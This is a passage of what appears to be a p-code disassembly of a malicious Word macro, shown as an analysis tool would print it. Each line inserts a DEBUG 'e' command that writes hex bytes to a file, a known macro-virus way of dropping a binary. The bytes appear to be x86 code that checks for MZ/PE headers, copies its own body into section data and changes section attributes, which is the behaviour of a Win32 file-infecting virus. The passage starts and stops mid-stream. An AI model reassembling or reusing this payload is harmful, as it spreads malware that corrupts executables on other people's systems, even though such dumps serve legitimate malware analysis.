' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #282:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1240 00 66 c7 85 79 17 40 00 00 00 81 c1 d9 14 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #283:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1250 81 c1 00 10 00 00 89 8d 4d 17 40 00 89 b5 55 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #284:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1260 40 00 56 ff 95 b5 11 40 00 83 f8 00 74 06 89 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #285:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1270 51 17 40 00 68 80 00 00 00 56 ff 95 b9 11 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #286:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1280 6a 00 6a 00 6a 03 6a 00 6a 01 68 00 00 00 c0 56 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #287:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1290 ff 95 c1 11 40 00 89 85 49 17 40 00 83 f8 ff 0f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #288:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12a0 84 c4 03 00 00 bb 59 17 40 00 03 dd 53 83 c3 08 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #289:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12b0 53 83 c3 08 53 50 ff 95 c9 11 40 00 6a 00 ff b5 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #290:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12c0 49 17 40 00 ff 95 d5 11 40 00 89 85 71 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #291:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12d0 6a 00 ff b5 4d 17 40 00 6a 00 6a 04 6a 00 ff b5 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #292:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12e0 49 17 40 00 ff 95 a9 11 40 00 89 85 45 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #293:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12f0 83 f8 00 0f 84 12 03 00 00 ff b5 4d 17 40 00 6a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #294:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1300 00 6a 00 6a 02 50 ff 95 ad 11 40 00 83 f8 00 0f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #295:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1310 84 ea 02 00 00 8b f0 89 b5 75 17 40 00 66 81 3e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #296:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1320 4d 5a 0f 85 c2 02 00 00 66 81 7e 12 52 44 0f 84 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #297:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1330 b6 02 00 00 8b 7e 3c 81 ff 00 10 00 00 0f 87 a7 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #298:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1340 02 00 00 03 fe 66 81 3f 50 45 0f 85 9a 02 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #299:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1350 89 bd 7b 17 40 00 66 8b 47 16 66 a9 00 20 0f 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #300:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1360 86 02 00 00 83 c7 18 8b 47 24 89 85 83 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #301:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1370 8b 47 20 89 85 87 17 40 00 8b 47 10 89 85 c4 13 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #302:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1380 40 00 8b 47 1c 89 85 a0 13 40 00 8b 87 88 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #303:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1390 00 89 85 b4 17 40 00 8b 47 70 89 85 b8 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #304:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13a0 8b 5f 5c c1 e3 03 33 c0 66 8b 47 ee 48 b9 28 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #305:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13b0 00 00 f7 e1 8b b5 7b 17 40 00 83 c6 18 83 c6 60 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #306:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13c0 03 f3 03 f0 8b 46 0c 89 85 a8 17 40 00 8b 8d b4 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #307:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13d0 17 40 00 83 f9 00 74 10 3b c8 75 0c c7 85 b0 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #308:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13e0 40 00 01 00 00 00 eb 21 8b 8d b8 17 40 00 83 f9 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #309:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13f0 00 0f 84 f3 01 00 00 3b c8 0f 85 eb 01 00 00 c7 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #310:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1400 85 b0 17 40 00 03 00 00 00 89 b5 7f 17 40 00 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #311:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1410 fe 83 c7 28 b9 28 00 00 00 f3 a4 ff 76 08 6a 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #312:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1420 ff 95 f5 11 40 00 0b c0 0f 84 bc 01 00 00 8b f8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #313:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1430 8b 4e 08 51 8b 76 14 03 b5 75 17 40 00 56 f3 a4 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #314:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1440 5f 8d b5 00 10 40 00 b9 d9 14 00 00 f3 a4 50 b8 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #315:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1450 d9 14 00 00 8b 8d 83 17 40 00 50 51 33 d2 f7 f1 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #316:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1460 59 81 c1 d9 14 00 00 2b ca 78 0b 89 8d 8b 17 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #317:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1470 00 58 b0 00 f3 aa 58 59 8b f0 81 ef d9 14 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #318:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1480 f3 a4 0f 23 c7 e8 cf 06 00 00 8b b5 7f 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #319:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1490 56 87 f7 8d b5 9f 17 40 00 b9 08 00 00 00 f3 a4 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #320:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14a0 5e c7 46 24 40 00 00 c0 c7 46 08 d9 14 00 00 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #321:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14b0 85 8b 17 40 00 89 46 10 8b 5e 0c 53 03 d8 93 8b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #322:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14c0 8d 87 17 40 00 33 d2 f7 f1 40 f7 e1 93 83 c6 28 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #323:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14d0 01 46 14 53 8b 4e 0c 2b d9 89 9d bc 17 40 00 5b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #324:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14e0 89 5e 0c 89 9d ac 17 40 00 83 bd b0 17 40 00 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #325:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14f0 74 5b 8b 76 14 03 b5 75 17 40 00 8b fe 83 c7 10 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #326:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1500 e8 02 00 00 00 eb 46 33 c9 66 8b 4e 0c 66 03 4e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #327:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1510 0e 83 c6 10 51 56 e8 08 00 00 00 5e 59 83 c6 08 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #328:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1520 e2 f2 c3 8b 46 04 8b f7 a9 00 00 00 80 74 10 35 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #329:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1530 00 00 00 80 03 f0 83 ee 10 e8 c9 ff ff ff c3 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #330:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1540 f0 83 ee 10 8b 85 bc 17 40 00 01 06 c3 8b 85 71 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #331:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1550 17 40 00 05 d9 14 00 00 8b 8d 83 17 40 00 50 51 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #332:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1560 33 d2 f7 f1 59 2b ca 58 03 c1 89 85 71 17 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #333:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1570 0f 21 c1 2b 0d 75 17 40 00 2b c1 78 08 91 0f 21 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #334:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1580 c7 b0 00 f3 aa 8b b5 7b 17 40 00 ff 46 06 83 c6 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #335:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
